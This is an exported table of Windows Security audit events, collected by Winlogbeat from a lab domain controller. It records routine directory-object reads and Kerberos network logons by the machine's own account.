				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e5-0de6-11d0-a285-00aa003049e2}
			{bf96793f-0de6-11d0-a285-00aa003049e2}
		{59ba2f42-79a2-11d0-9020-00c04fc2d3cf}
			{bf967953-0de6-11d0-a285-00aa003049e2}
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{bf967a76-0de6-11d0-a285-00aa003049e2}
			{f30e3bc0-9ff0-11d1-b603-0000f80367c1}
			{f30e3bc1-9ff0-11d1-b603-0000f80367c1}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
			{42a75fc6-783f-11d2-9916-0000f87a57d4}
			{7bd4c7a6-1add-4436-8c04-3999a880154c}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110067	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"dRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		READ_CONTROL
				
	Access Mask:		0x20000
	Properties:		READ_CONTROL
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%1538
				"	0x20000	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%1538
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110066	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"dBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{bf967a8b-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{d659c65a-90e5-4db1-882a-66fb7e09695c}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{bf967a8b-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{d659c65a-90e5-4db1-882a-66fb7e09695c}"	DS	"%{bf967a8b-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{bf967a8b-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110065	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"cxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}
	Object Name:		%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{8cf7d930-60f0-445c-8eb7-1ea3cd4a16c5}"	DS	"%{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{bf967976-0de6-11d0-a285-00aa003049e2}
			{32ff8ecc-783f-11d2-9916-0000f87a57d4}
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{f30e3bc2-9ff0-11d1-b603-0000f80367c1}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110064	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.540"	"chDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x649886
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	192.168.1.251
	Source Port:		50489

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"192.168.1.251"	50489	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x649886	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"3,876"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110062	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:11.537"	"cRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110058	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.537"	"cBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		List Contents
				
	Access Mask:		0x4
	Properties:		List Contents
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7682
				"	0x4	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7682
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110057	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.537"	"bxDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{bf967aa5-0de6-11d0-a285-00aa003049e2}
	Object Name:		%{36761a13-1d02-46ee-b2d7-084a40b1f759}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{36761a13-1d02-46ee-b2d7-084a40b1f759}"	DS	"%{bf967aa5-0de6-11d0-a285-00aa003049e2}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{bf967aa5-0de6-11d0-a285-00aa003049e2}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110056	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.537"	"bhDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{771727b1-31b8-4cdf-ae62-4fe39fadf89e}
			{f30e3bbe-9ff0-11d1-b603-0000f80367c1}
			{f30e3bbf-9ff0-11d1-b603-0000f80367c1}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110055	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.537"	"bRDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	"Directory Service Access"	4662	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An operation was performed on an object.

Subject :
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019
	Logon ID:		0x6496A9

Object:
	Object Server:		DS
	Object Type:		%{19195a5b-6da0-11d0-afd3-00c04fd930c9}
	Object Name:		%{a585c3e8-301b-455d-acb6-9de420bfc732}
	Handle ID:		0x0

Operation:
	Operation Type:		Object Access
	Accesses:		Read Property
				
	Access Mask:		0x10
	Properties:		Read Property
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}


Additional Information:
	Parameter 1:		-
	Parameter 2:		"	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	"%%7684
				"	0x10	"'-"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%{a585c3e8-301b-455d-acb6-9de420bfc732}"	DS	"%{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	"Object Access"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	"%%7684
		{e48d0154-bcf8-11d1-8702-00c04fb96050}
			{bf9679e4-0de6-11d0-a285-00aa003049e2}
	{19195a5b-6da0-11d0-afd3-00c04fd930c9}"	" - "	" - "	" - "	LAB2019	0x6496a9	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	4662	"Audit Success"	Info	644	768	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110054	"Directory Service Access"	" - "	" - "	" - "	" - "	-
"May 28, 2026 @ 21:03:11.537"	"bBDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x649829
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{be51111d-d37b-ce63-1a45-615fd7354225}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		0

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1833"	" - "	"::1"	0	0	"'-"	"{be51111d-d37b-ce63-1a45-615fd7354225}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x649829	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110052	Logon	" - "	" - "	" - "	" - "	2
"May 28, 2026 @ 21:03:11.529"	"axDBb54ByrYY_kgLWe46"	" - "	".ds-winlogbeat-8.19.14-2026.05.13-000002"	"'-"	"8a008e94-7973-4408-86f6-e55f4203034c"	"WIN-JOCP945SK51"	"aecf2b7e-1c30-46b5-b3f8-cbbfea77b7a6"	"WIN-JOCP945SK51"	winlogbeat	"8.19.14"	"8.0.0"	Logon	4624	"May 28, 2026 @ 21:03:12.963"	event	success	"Microsoft-Windows-Security-Auditing"	"WIN-JOCP945SK51.lab2019.local"	information	"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		WIN-JOCP945SK51$
	Account Domain:		LAB2019.LOCAL
	Logon ID:		0x649734
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{cf30678a-e5d9-49b8-4174-9bcc7be9e1d6}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		50488

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested."	wineventlog	Security	"WIN-JOCP945SK51.lab2019.local"	" - "	" - "	" - "	Kerberos	" - "	" - "	" - "	" - "	" - "	"%%1842"	" - "	" - "	" - "	" - "	"%%1840"	" - "	"::1"	50488	0	"'-"	"{cf30678a-e5d9-49b8-4174-9bcc7be9e1d6}"	" - "	Kerberos	3	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	" - "	0x0	"'-"	" - "	" - "	"'-"	" - "	" - "	"'-"	0x0	"'-"	"S-1-0-0"	"LAB2019.LOCAL"	0x0	0x649734	"'-"	"'-"	"WIN-JOCP945SK51$"	"S-1-5-18"	" - "	"'-"	" - "	" - "	"%%1843"	"'-"	" - "	" - "	4624	"Audit Success"	Info	644	"4,076"	"{54849625-5478-4994-a5ba-3e3b0328c30d}"	"Microsoft-Windows-Security-Auditing"	1110046	Logon	" - "	" - "	" - "	" - "	2
